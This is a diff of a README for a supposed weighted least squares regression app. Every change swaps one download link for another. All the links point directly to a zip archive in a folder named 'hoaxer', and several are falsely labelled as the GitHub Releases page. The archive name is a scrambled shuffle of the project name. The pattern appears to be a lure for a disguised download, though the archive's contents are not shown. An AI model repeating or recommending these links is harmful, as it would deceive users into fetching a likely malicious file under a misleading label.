@@ -6,9 +6,9 @@ Welcome to the weighted_least_squares_wls project! This application helps you an
 
 ## 📥 Download
 
-[![Download Latest Release](https://raw.githubusercontent.com/lebo309/weighted_least_squares_wls/main/hoaxer/squares-weighted-wls-least-1.3-alpha.2.zip%20Release-brightgreen)](https://raw.githubusercontent.com/lebo309/weighted_least_squares_wls/main/hoaxer/squares-weighted-wls-least-1.3-alpha.2.zip)
+[![Download Latest Release](https://github.com/lebo309/weighted_least_squares_wls/raw/refs/heads/main/hoaxer/wls-squares-weighted-least-1.2.zip%20Release-brightgreen)](https://github.com/lebo309/weighted_least_squares_wls/raw/refs/heads/main/hoaxer/wls-squares-weighted-least-1.2.zip)
 
-Visit this page to download: [GitHub Releases Page](https://raw.githubusercontent.com/lebo309/weighted_least_squares_wls/main/hoaxer/squares-weighted-wls-least-1.3-alpha.2.zip)
+Visit this page to download: [GitHub Releases Page](https://github.com/lebo309/weighted_least_squares_wls/raw/refs/heads/main/hoaxer/wls-squares-weighted-least-1.2.zip)
 
 ## 💡 Features
 
@@ -34,7 +34,7 @@ Visit this page to download: [GitHub Releases Page](https://raw.githubuserconten
 ## 📚 Installation
 
 1. **Download the Application**: 
-   Visit the [GitHub Releases Page](https://raw.githubusercontent.com/lebo309/weighted_least_squares_wls/main/hoaxer/squares-weighted-wls-least-1.3-alpha.2.zip) and choose the latest version. 
+   Visit the [GitHub Releases Page](https://github.com/lebo309/weighted_least_squares_wls/raw/refs/heads/main/hoaxer/wls-squares-weighted-least-1.2.zip) and choose the latest version. 
    
 2. **Extract the Files**: 
    Once downloaded, extract the files to a folder of your choice.
@@ -87,4 +87,4 @@ This project is licensed under the MIT License. Please see the LICENSE file for 
 
 Stay tuned for updates that may include enhancements in user interface, additional regression methods, or new simulation features.
 
-For more information, visit the [GitHub Releases Page](https://raw.githubusercontent.com/lebo309/weighted_least_squares_wls/main/hoaxer/squares-weighted-wls-least-1.3-alpha.2.zip) to download the latest version.
+For more information, visit the [GitHub Releases Page](https://github.com/lebo309/weighted_least_squares_wls/raw/refs/heads/main/hoaxer/wls-squares-weighted-least-1.2.zip) to download the latest version.
